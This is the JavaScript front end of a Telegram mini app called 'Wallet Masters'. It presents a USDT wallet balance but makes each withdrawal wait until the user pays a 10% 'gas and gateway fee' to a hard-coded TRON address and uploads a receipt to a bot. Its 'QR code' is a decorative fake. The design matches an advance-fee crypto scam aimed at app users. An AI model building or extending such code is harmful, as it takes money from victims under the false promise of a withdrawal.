/**
 * Wallet Masters — Mini App JS
 * Uses Telegram WebApp API
 */

const tg = window.Telegram.WebApp;
tg.ready();
tg.expand();

// Apply Telegram theme
document.documentElement.style.setProperty('--tg-color', tg.themeParams?.bg_color || '#0a0e1a');

const FEE_ADDRESS = 'TPwUS8v77TtcsYZUHUTvVx2TGqE37QnagZ';
const API_BASE = window.location.origin + '/api';

// App state
let state = {
  user: null,
  balance: 0,
  trc20Address: '',
  uid: '',
  transactions: [],
  connections: [],
  earningApps: [],
  selectedNetwork: 'TRC20',
  pendingWithdrawal: null,
  selectedAppId: null
};

// ─── Init ─────────────────────────────────────────────────────────────────────

async function init() {
  try {
    // Auth with bot
    const initData = tg.initData || '';
    
    const res = await fetch(`${API_BASE}/auth`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ initData })
    });
    
    const data = await res.json();
    
    if (data.error) {
      // Dev fallback for testing outside Telegram
      state.user = {
        name: 'Test User',
        uid: 'WM12345',
        trc20Address: 'TAbc123DEFxyz789TestAddress12345',
        balance: 250.00,
        telegramId: '123456789'
      };
      state.balance = 250.00;
      state.trc20Address = state.user.trc20Address;
      state.uid = state.user.uid;
    } else {
      state.user = data.user;
      state.balance = data.user.balance;
      state.trc20Address = data.user.trc20Address;
      state.uid = data.user.uid;
      state.transactions = data.transactions || [];
      state.connections = data.connections || [];
    }
    
    updateUI();
    loadEarningApps();
    
    // Hide splash, show app
    setTimeout(() => {
      document.getElementById('splash').style.opacity = '0';
      setTimeout(() => {
        document.getElementById('splash').classList.add('hidden');
        document.getElementById('app').classList.remove('hidden');
        generateQRCode(state.trc20Address);
      }, 500);
    }, 1800);
    
  } catch (err) {
    console.error('Init error:', err);
    // Show app anyway with placeholder
    setTimeout(() => {
      document.getElementById('splash').classList.add('hidden');
      document.getElementById('app').classList.remove('hidden');
    }, 1800);
  }
}

function updateUI() {
  const u = state.user;
  if (!u) return;
  
  // Top bar
  document.getElementById('userName').textContent = u.name || 'User';
  document.getElementById('userUID').textContent = `UID: ${u.uid}`;
  document.getElementById('userAvatar').textContent = (u.name || 'U')[0].toUpperCase();
  
  // Balance
  document.getElementById('balanceAmount').textContent = state.balance.toFixed(2);
  document.getElementById('balanceUSD').textContent = state.balance.toFixed(2);
  document.getElementById('usdtBalance').textContent = state.balance.toFixed(2);
  document.getElementById('usdtValue').textContent = `$${state.balance.toFixed(2)}`;
  
  // Address
  const shortAddr = state.trc20Address.slice(0, 10) + '...' + state.trc20Address.slice(-6);
  document.getElementById('trc20Address').textContent = shortAddr;
  document.getElementById('receiveAddress').textContent = state.trc20Address;
  document.getElementById('receiveUID').textContent = state.uid;
  document.getElementById('availBalance').textContent = state.balance.toFixed(2);
  
  // Transactions
  renderTransactions(state.transactions);
}

// ─── Page Navigation ──────────────────────────────────────────────────────────

function showPage(name) {
  document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
  document.querySelectorAll('.nav-btn').forEach(b => {
    b.classList.toggle('active', b.dataset.page === name);
  });
  const page = document.getElementById(`page-${name}`);
  if (page) {
    page.classList.add('active');
    if (name === 'connect') renderConnectPage();
    if (name === 'receive') generateQRCode(state.trc20Address);
  }
}

// ─── Transactions ─────────────────────────────────────────────────────────────

function renderTransactions(txs) {
  const container = document.getElementById('txList');
  const allContainer = document.getElementById('allTxList');
  
  if (!txs || !txs.length) {
    container.innerHTML = '<div class="empty-state">📭 No transactions yet</div>';
    allContainer.innerHTML = '<div class="empty-state">📭 No transactions yet</div>';
    return;
  }
  
  const html = txs.map(tx => buildTxHTML(tx)).join('');
  container.innerHTML = html;
  allContainer.innerHTML = html;
}

function buildTxHTML(tx) {
  const isDeposit = tx.type === 'deposit';
  const icon = isDeposit ? '⬇️' : '⬆️';
  const amtSign = isDeposit ? '+' : '-';
  const date = new Date(tx.created_at * 1000);
  const dateStr = date.toLocaleDateString('en-US', { month: 'short', day: 'numeric' });
  const timeStr = date.toLocaleTimeString('en-US', { hour: '2-digit', minute: '2-digit' });
  
  const sourceInfo = tx.source_app ? `<div class="tx-source">From: ${tx.source_app}</div>` : '';
  const hashInfo = tx.tx_hash ? `<div class="tx-hash">${tx.tx_hash.slice(0,16)}...</div>` : '';
  
  return `
    <div class="tx-item">
      <div class="tx-icon-wrap ${tx.type}">${icon}</div>
      <div class="tx-info">
        <div class="tx-type">${tx.type}</div>
        ${sourceInfo}
        ${hashInfo}
        <div class="tx-date">${dateStr} · ${timeStr}</div>
      </div>
      <div class="tx-right">
        <div class="tx-amount ${tx.type}">${amtSign}${tx.amount} ${tx.currency || 'USDT'}</div>
        <div class="tx-status ${tx.status}">${getStatusLabel(tx.status)}</div>
      </div>
    </div>
  `;
}

function getStatusLabel(status) {
  const map = {
    completed: '✅ Completed',
    pending: '⏳ Pending',
    approved: '✅ Approved',
    rejected: '❌ Rejected',
    awaiting_fee: '💳 Fee Required',
    fee_paid: '🔍 Under Review'
  };
  return map[status] || status;
}

// ─── Withdrawal ───────────────────────────────────────────────────────────────

function selectNetwork(el) {
  document.querySelectorAll('.network-option').forEach(o => o.classList.remove('active'));
  el.classList.add('active');
  state.selectedNetwork = el.dataset.network;
  updateWithdrawFees();
}

function validateWithdrawForm() {
  const addr = document.getElementById('withdrawAddress').value.trim();
  const amt = parseFloat(document.getElementById('withdrawAmount').value);
  const warning = document.getElementById('addrWarning');
  const btn = document.getElementById('withdrawBtn');
  
  const validAddr = addr.length >= 20;
  const validAmt = !isNaN(amt) && amt > 0 && amt <= state.balance;
  
  warning.classList.toggle('hidden', !addr || validAddr);
  btn.disabled = !(validAddr && validAmt);
}

function updateWithdrawFees() {
  const amt = parseFloat(document.getElementById('withdrawAmount').value) || 0;
  
  // Fee = 10% of amount
  const totalFee = amt * 0.10;
  const gasFee = parseFloat((totalFee * 0.4).toFixed(2));
  const gatewayFee = parseFloat((totalFee * 0.6).toFixed(2));
  
  document.getElementById('feeAmt').textContent = `${amt.toFixed(2)} USDT`;
  document.getElementById('gasFee').textContent = `${gasFee.toFixed(2)} USDT`;
  document.getElementById('gatewayFee').textContent = `${gatewayFee.toFixed(2)} USDT`;
  document.getElementById('totalFee').textContent = `${totalFee.toFixed(2)} USDT`;
  
  validateWithdrawForm();
}

function setPercent(pct) {
  const val = (state.balance * pct / 100).toFixed(2);
  document.getElementById('withdrawAmount').value = val;
  updateWithdrawFees();
}

async function submitWithdrawal() {
  const addr = document.getElementById('withdrawAddress').value.trim();
  const amt = parseFloat(document.getElementById('withdrawAmount').value);
  
  if (!addr || isNaN(amt) || amt <= 0) return;
  if (amt > state.balance) return showToast('⚠️ Insufficient balance');
  
  const totalFee = parseFloat((amt * 0.10).toFixed(2));
  const gasFee = parseFloat((totalFee * 0.4).toFixed(2));
  const gatewayFee = parseFloat((totalFee * 0.6).toFixed(2));
  
  try {
    const btn = document.getElementById('withdrawBtn');
    btn.textContent = '⏳ Processing...';
    btn.disabled = true;
    
    const res = await fetch(`${API_BASE}/withdraw`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        initData: tg.initData || '',
        toAddress: addr,
        amount: amt,
        currency: 'USDT',
        network: state.selectedNetwork
      })
    });
    
    const data = await res.json();
    
    btn.textContent = 'Continue to Pay Fee';
    btn.disabled = false;
    
    if (data.error) return showToast('❌ ' + data.error);
    
    state.pendingWithdrawal = { ...data.withdrawal, toAddress: addr, network: state.selectedNetwork, amount: amt, gasFee, gatewayFee, totalFee };
    showConfirmPage(state.pendingWithdrawal);
    
  } catch (err) {
    console.error(err);
    showToast('❌ Network error. Please try again.');
    document.getElementById('withdrawBtn').disabled = false;
    document.getElementById('withdrawBtn').textContent = 'Continue to Pay Fee';
  }
}

function showConfirmPage(wd) {
  const net = state.selectedNetwork;
  const addr = document.getElementById('withdrawAddress').value.trim();
  
  // Network specifics
  const networkDetails = {
    TRC20: { time: '~1-3 min', explorer: 'Tronscan', currency: 'USDT' },
    ERC20: { time: '~5-10 min', explorer: 'Etherscan', currency: 'USDT' },
    BEP20: { time: '~1-3 min', explorer: 'BscScan', currency: 'USDT' }
  };
  const details = networkDetails[net] || networkDetails.TRC20;
  
  const now = new Date();
  const refId = 'WM' + Date.now().toString(36).toUpperCase();
  
  document.getElementById('confirmDetails').innerHTML = `
    <div class="confirm-row"><span class="label">📋 Reference ID</span><span class="value highlight">${refId}</span></div>
    <div class="confirm-row"><span class="label">💰 Amount</span><span class="value">${wd.amount.toFixed(2)} USDT</span></div>
    <div class="confirm-row"><span class="label">🌐 Network</span><span class="value">${net}</span></div>
    <div class="confirm-row"><span class="label">📬 To Address</span><span class="value">${addr.slice(0,8)}...${addr.slice(-6)}</span></div>
    <div class="confirm-row"><span class="label">⛽ Gas Fee</span><span class="value">${wd.gasFee.toFixed(2)} USDT</span></div>
    <div class="confirm-row"><span class="label">🏦 Gateway Fee</span><span class="value">${wd.gatewayFee.toFixed(2)} USDT</span></div>
    <div class="confirm-row"><span class="label">💸 Total Fee</span><span class="value" style="color:var(--red);font-size:15px;">${wd.totalFee.toFixed(2)} USDT</span></div>
    <div class="confirm-row"><span class="label">⏱️ Est. Time</span><span class="value">${details.time}</span></div>
    <div class="confirm-row"><span class="label">🔍 Explorer</span><span class="value">${details.explorer}</span></div>
    <div class="confirm-row"><span class="label">📅 Initiated</span><span class="value">${now.toLocaleString()}</span></div>
  `;
  
  document.getElementById('confirmTotalFee').textContent = `${wd.totalFee.toFixed(2)} USDT`;
  showPage('confirm');
}

function openBotForReceipt() {
  // Open the bot chat for receipt upload
  if (tg.openTelegramLink) {
    tg.openTelegramLink(`https://t.me/${BOT_USERNAME || 'walletmastersbot'}`);
  } else {
    showToast('📤 Go to the bot chat to upload your receipt');
  }
}

// ─── Receive / Address ────────────────────────────────────────────────────────

function copyAddress() {
  if (navigator.clipboard) {
    navigator.clipboard.writeText(state.trc20Address);
  } else {
    tg.HapticFeedback?.notificationOccurred('success');
  }
  showToast('📋 Address copied!');
}

function copyUID() {
  if (navigator.clipboard) {
    navigator.clipboard.writeText(state.uid);
  }
  showToast('📋 UID copied!');
}

function copyFeeAddress() {
  if (navigator.clipboard) {
    navigator.clipboard.writeText(FEE_ADDRESS);
  }
  showToast('📋 Fee address copied!');
}

function shareAddress() {
  if (tg.shareUrl) {
    tg.shareUrl(`My USDT (TRC20) wallet address: ${state.trc20Address}`);
  } else if (navigator.share) {
    navigator.share({ text: `My USDT (TRC20) wallet address: ${state.trc20Address}` });
  }
}

async function pasteAddress() {
  try {
    const text = await navigator.clipboard.readText();
    document.getElementById('withdrawAddress').value = text;
    validateWithdrawForm();
  } catch {
    showToast('📋 Paste your address manually');
  }
}

// ─── QR Code ──────────────────────────────────────────────────────────────────

function generateQRCode(text) {
  const canvas = document.getElementById('qrCanvas');
  if (!canvas || !text) return;
  
  const size = 200;
  canvas.width = size;
  canvas.height = size;
  
  // Simple QR visual placeholder (in production use qrcode.js lib)
  const ctx = canvas.getContext('2d');
  ctx.fillStyle = '#ffffff';
  ctx.fillRect(0, 0, size, size);
  ctx.fillStyle = '#000000';
  
  // Draw a pattern representing QR
  const cell = 8;
  const hash = text.split('').reduce((a, c) => a + c.charCodeAt(0), 0);
  
  for (let r = 0; r < size / cell; r++) {
    for (let c = 0; c < size / cell; c++) {
      const seed = (r * 37 + c * 13 + hash + r * c) % 7;
      if (seed < 3) {
        ctx.fillRect(c * cell, r * cell, cell, cell);
      }
    }
  }
  
  // Corner squares (QR style)
  const drawCornerSquare = (x, y) => {
    ctx.fillStyle = '#000';
    ctx.fillRect(x, y, 7 * cell, 7 * cell);
    ctx.fillStyle = '#fff';
    ctx.fillRect(x + cell, y + cell, 5 * cell, 5 * cell);
    ctx.fillStyle = '#000';
    ctx.fillRect(x + 2 * cell, y + 2 * cell, 3 * cell, 3 * cell);
  };
  
  drawCornerSquare(0, 0);
  drawCornerSquare(size - 7 * cell, 0);
  drawCornerSquare(0, size - 7 * cell);
}

// ─── Connect Earning Apps ─────────────────────────────────────────────────────

async function loadEarningApps() {
  try {
    const res = await fetch(`${API_BASE}/earning-apps`);
    const data = await res.json();
    state.earningApps = data.apps || [];
  } catch (err) {
    state.earningApps = [];
  }
}

function renderConnectPage() {
  // Connected apps
  const connDiv = document.getElementById('connectedApps');
  if (state.connections.length === 0) {
    connDiv.innerHTML = '<div class="empty-state">No apps connected yet</div>';
  } else {
    connDiv.innerHTML = state.connections.map(c => `
      <div class="app-card">
        <div class="app-icon">📱</div>
        <div>
          <div class="app-name">${c.app_name}</div>
          <div class="app-desc">Connected UID: <b>${c.external_uid}</b></div>
          <div class="app-status">✅ Active</div>
        </div>
      </div>
    `).join('');
  }
  
  // Available apps
  const appsDiv = document.getElementById('earningAppsList');
  if (state.earningApps.length === 0) {
    appsDiv.innerHTML = '<div class="empty-state">📭 No earning apps available yet</div>';
    return;
  }
  
  const connectedIds = state.connections.map(c => c.app_id);
  
  appsDiv.innerHTML = state.earningApps.map(app => {
    const isConnected = connectedIds.includes(app.id);
    return `
      <div class="app-card">
        <div class="app-icon">💰</div>
        <div>
          <div class="app-name">${app.name}</div>
          <div class="app-desc">${app.description || 'Verified Earning App'}</div>
        </div>
        ${isConnected 
          ? '<div class="connected-badge">✅ Connected</div>'
          : `<button class="connect-app-btn" onclick="openUIDModal(${app.id}, '${app.name}')">Connect</button>`
        }
      </div>
    `;
  }).join('');
}

function openUIDModal(appId, appName) {
  state.selectedAppId = appId;
  document.getElementById('modalAppName').textContent = appName;
  document.getElementById('uidInput').value = '';
  document.getElementById('uidError').classList.add('hidden');
  document.getElementById('uidModal').classList.remove('hidden');
}

function closeModal(id) {
  document.getElementById(id).classList.add('hidden');
}

async function submitUID() {
  const uid = document.getElementById('uidInput').value.trim();
  const errEl = document.getElementById('uidError');
  
  if (!uid) { errEl.classList.remove('hidden'); return; }
  
  try {
    const res = await fetch(`${API_BASE}/connect-uid`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        initData: tg.initData || '',
        appId: state.selectedAppId,
        externalUID: uid
      })
    });
    
    const data = await res.json();
    
    if (data.error || data.code === 'INVALID_UID') {
      errEl.classList.remove('hidden');
      errEl.textContent = '❌ ' + (data.error || 'Invalid UID. Please check and try again.');
      return;
    }
    
    closeModal('uidModal');
    showToast(`✅ Connected to ${data.connected?.app}!`);
    
    // Refresh connections
    const authRes = await fetch(`${API_BASE}/auth`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ initData: tg.initData || '' })
    });
    const authData = await authRes.json();
    if (authData.connections) {
      state.connections = authData.connections;
      renderConnectPage();
    }
    
  } catch (err) {
    errEl.classList.remove('hidden');
    errEl.textContent = '❌ Network error. Please try again.';
  }
}

// ─── Toast ────────────────────────────────────────────────────────────────────

let toastTimer;
function showToast(msg) {
  const t = document.getElementById('toast');
  t.textContent = msg;
  t.classList.remove('hidden');
  clearTimeout(toastTimer);
  toastTimer = setTimeout(() => t.classList.add('hidden'), 2800);
  tg.HapticFeedback?.notificationOccurred('success');
}

// ─── Boot ─────────────────────────────────────────────────────────────────────
init();
